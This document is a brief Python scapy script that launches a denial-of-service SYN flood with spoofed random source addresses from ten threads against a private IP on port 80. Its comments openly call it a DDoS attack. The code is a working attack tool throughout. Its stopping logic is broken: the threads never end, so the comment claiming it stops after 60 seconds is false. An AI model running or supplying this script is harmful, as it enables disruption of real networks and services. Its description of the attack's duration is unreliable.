# Install scapy library
from scapy.all import *
import random
import threading
import time
# Define the target IP address and port
target_ip = "192.168.1.100" 
target_port = 80
# Create a function to send malicious packets
def send_malicious_packets():
    while True:
        # Generate a random IP address for the source
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        
        # Create a malicious packet
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
        
        # Send the packet
        send(packet, verbose=False)
# Create multiple threads to simulate multiple attackers
num_threads = 10
threads = []

for _ in range(num_threads):
    t = threading.Thread(target=send_malicious_packets)
    threads.append(t)
    t.start()
# Run the DDoS attack for a certain duration
duration = 60  # Duration in seconds
time.sleep(duration)
# Stop the attack and wait for the threads to finish
for t in threads:
    t.join()